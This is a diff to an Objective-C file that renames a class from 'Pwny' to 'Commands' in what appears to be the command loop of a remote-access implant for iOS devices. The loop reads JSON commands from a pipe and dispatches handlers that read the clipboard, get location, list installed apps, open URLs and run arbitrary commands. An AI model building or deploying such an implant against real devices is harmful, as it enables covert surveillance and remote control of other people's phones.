@@ -23,7 +23,7 @@
 */
 
 #import "base64.h"
-#import "pwny.h"
+#import "commands.h"
 
 #import "channel.h"
 #import "utils.h"
@@ -32,7 +32,7 @@ Channel *channel = [[Channel alloc] init];
 Utils *utils = [[Utils alloc] init];
 
 void interactPipe(int channelPipe) {
-    Pwny *pwny = [[Pwny alloc] init:channelPipe];
+    Commands *commands = [[Commands alloc] init:channelPipe];
 
     while (YES) {
         NSString *inputString = [channel readChannel:channelPipe];
@@ -44,35 +44,35 @@ void interactPipe(int channelPipe) {
         NSString *args = [jsonDict objectForKey:@"args"];
 
         if ([cmd isEqualToString:@"sysinfo"])
-            [pwny cmd_sysinfo];
+            [commands cmd_sysinfo];
         else if ([cmd isEqualToString:@"getpid"])
-            [pwny cmd_getpid];
+            [commands cmd_getpid];
         else if ([cmd isEqualToString:@"getpaste"])
-            [pwny cmd_getpaste];
+            [commands cmd_getpaste];
         else if ([cmd isEqualToString:@"battery"])
-            [pwny cmd_battery];
+            [commands cmd_battery];
         else if ([cmd isEqualToString:@"getvol"])
-            [pwny cmd_getvol];
+            [commands cmd_getvol];
         else if ([cmd isEqualToString:@"locate"])
-            [pwny cmd_locate];
+            [commands cmd_locate];
         else if ([cmd isEqualToString:@"vibrate"])
-            [pwny cmd_vibrate];
+            [commands cmd_vibrate];
         else if ([cmd isEqualToString:@"bundleids"])
-            [pwny cmd_bundleids];
+            [commands cmd_bundleids];
         else if ([cmd isEqualToString:@"exec"])
-            [pwny cmd_exec:args];
+            [commands cmd_exec:args];
         else if ([cmd isEqualToString:@"say"])
-            [pwny cmd_say:args];
+            [commands cmd_say:args];
         else if ([cmd isEqualToString:@"setvol"])
-            [pwny cmd_setvol:args];
+            [commands cmd_setvol:args];
         else if ([cmd isEqualToString:@"player"])
-            [pwny cmd_player:args];
+            [commands cmd_player:args];
         else if ([cmd isEqualToString:@"openapp"])
-            [pwny cmd_openapp:args];
+            [commands cmd_openapp:args];
         else if ([cmd isEqualToString:@"openurl"])
-            [pwny cmd_openurl:args];
+            [commands cmd_openurl:args];
         else if ([cmd isEqualToString:@"chdir"])
-            [pwny cmd_chdir:args];
+            [commands cmd_chdir:args];
         else if ([cmd isEqualToString:@"exit"])
             break;
     }
